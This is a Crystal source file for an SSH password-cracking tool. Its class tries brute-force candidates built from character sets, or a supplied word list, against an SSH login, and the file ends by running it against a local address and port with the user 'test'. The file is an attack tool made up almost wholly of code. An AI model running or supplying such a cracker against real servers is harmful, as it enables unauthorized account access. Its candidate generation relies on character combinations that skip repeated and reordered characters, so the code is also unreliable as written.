require "ssh2"
require "socket"
require "./brute_helpers.cr"

module Cracker::SSH
	class SSHCracker
		def initialize(@address : Socket::IPAddress, @username : String)
		end

		# TODO Multithreading (or multi-processing)
		def brute(length : Int16, lower_case? : Bool, upper_case? : Bool, numbers? : Bool, symbols? : Bool) : String | Nil
			password_source = ""
			if lower_case?
				password_source += BruteHelpers.lowercase_letters
			end

			if upper_case?
				password_source += BruteHelpers.uppercase_letters
			end

			if numbers?
				password_source += BruteHelpers.numbers
			end

			if symbols?
				password_source += BruteHelpers.symbols
			end

			possible_passwords = password_source.chars.combinations length

			SSH2::Session.open(@address.address, @address.port) do |session|
				# TODO better char array to str
				possible_passwords.each do |password_chars|
					password = ""
					password_chars.each do |char|
						password += char
					end

					if self.correct_password? password, session
						return password
					end
				end
			end
		end

		def dictionary(dict : Array(String))
			SSH2::Session.open(@address.address, @address.port) do |session|
				dict.each do |password|
					if self.correct_password? password, session
						return password
					end
				end
			end
		end

		private def correct_password?(password : String, session : SSH2::Session) : Bool
			session.login @username, password
			return session.authenticated?
		end
	end
end

cracker = Cracker::SSH::SSHCracker.new(Socket::IPAddress.new("127.0.0.1", 8080), "test")

puts cracker.brute(5, true, true, true, true)
